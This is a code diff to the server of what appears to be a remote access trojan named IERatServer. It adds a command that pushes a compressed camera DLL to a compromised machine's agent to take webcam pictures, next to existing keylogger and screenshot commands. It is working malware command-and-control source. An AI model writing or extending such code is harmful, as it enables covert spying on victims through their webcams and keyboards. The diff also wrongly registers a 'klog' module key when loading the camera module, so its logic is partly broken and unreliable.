@@ -66,6 +66,9 @@ namespace IERatServer
             [Command(typeof(KeyloggerCommand), Description = "Keylogger module operations")]
             keylogger,
 
+            [Command(typeof(CameraSnapShotCommand), Description = "Capture a webcam picture")]
+            capture_camera,
+
             [Command(typeof(ClearCommand), Description = "Clear the console text")]
             clear,
 
@@ -111,6 +114,35 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AddTaskToActiveAgent("screenshot");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class CameraSnapShotCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
+                var agent = ActiveChannel.agent;
+                try
+                {
+                    if (agent.LoadedModules.ContainsKey("camsnapshot"))
+                    {
+                        AddTaskToActiveAgent("camsnapshot", "");
+                    }
+                    else
+                    {
+                        agent.LoadedModules.Add("klog", null);
+                        var CameraModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "CameraModule.dll"));
+                        AddTaskToActiveAgent("camsnapshot", Convert.ToBase64String(ServerUtils.Compress(CameraModule)));
+                        agent.LoadedModules.Add("camsnapshot", null);
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("Error - Unable to load webcam module - CameraModule.dll was not found in Modules folder");
+                    Logger.Log("error", "Unable to load webcam module - CameraModule.dll was not found in Modules folder");
+                }
                 return Task.FromResult(CommandResult.Success);
             }
         }
